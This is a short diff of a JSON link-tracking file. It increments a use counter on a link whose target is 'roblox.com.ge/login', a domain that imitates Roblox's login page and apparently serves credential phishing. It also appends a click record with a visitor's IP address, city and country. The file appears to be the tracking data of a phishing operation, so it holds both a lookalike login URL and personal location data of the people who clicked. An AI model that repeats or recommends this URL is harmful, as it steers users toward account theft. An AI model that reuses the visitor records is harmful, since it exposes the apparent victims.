@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1415,
+    "useCount": 1416,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11488,6 +11488,14 @@
         "city": "Tepic",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777428340028,
+        "ip": "112.207.171.115",
+        "country": "Philippines",
+        "city": "Paranaque City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
